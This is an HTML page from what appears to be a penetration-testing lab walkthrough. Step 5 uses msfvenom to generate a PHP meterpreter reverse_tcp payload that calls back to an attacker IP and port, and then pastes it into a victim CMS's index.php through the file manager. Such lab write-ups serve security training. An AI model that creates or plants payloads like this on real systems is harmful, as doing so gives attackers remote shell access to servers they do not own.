@@ -1,0 +1,8 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>5. Create a msfvenom php reverse</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><a name="h1-1"></a><strong><h1>5. Create a msfvenom php reverse</h1></strong><br /><br />Once we've logged in you can go to a “file manager” on the Menu option “Content”<br /><br /><br /><img src="images/62-1.png" alt="images/62-1.png" /><br /><br /><br />Click on “index.php” file.<br /><br /><img src="images/62-2.png" alt="images/62-2.png" /><br /><br /><br />On your Kali Linux create a msfvenom php reverse payload.<br /><br /><div class="codebox"><div class="codebox"><span style="color:#7f0044;font-weight:400">$msfvenom</span>&nbsp;-p&nbsp;php<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp&nbsp;&nbsp;LHOST=192.168.12.28&nbsp;LPORT=4444&nbsp;&gt;&nbsp;index.php</div></div><br /><br />This command will create a file called “index.php”.<br /><br />Click on the “index.php” file on the Victim Machine and opend it.<br /><br /><img src="images/62-3.png" alt="images/62-3.png" /><br /><br />Here you can add the contents of your recently created payload.<br /><br />Save the file.<br /><br /><img src="images/62-4.png" alt="images/62-4.png" /><br /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></body></html>
